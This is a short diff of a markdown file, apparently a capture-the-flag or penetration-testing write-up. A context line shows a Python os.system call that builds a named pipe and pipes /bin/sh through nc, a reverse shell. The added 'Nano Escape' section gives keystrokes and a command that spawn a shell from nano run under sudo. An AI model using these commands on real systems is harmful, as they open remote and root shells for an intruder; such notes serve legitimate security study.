@@ -25,3 +25,12 @@ __import__("os").system("mknod /tmp/backpipe2 p && /bin/sh 0</tmp/backpipe2 | nc
 ```
 
 ![test image](/img/craft/developer.png)
+
+# Nano Escape
+
+Opening nano as sudo we can then perform:
+```bash
+^R^X
+Reset; sh 1>&0 2>&0
+```
+Where ^R^X is ctrl+R and ctrl+X.
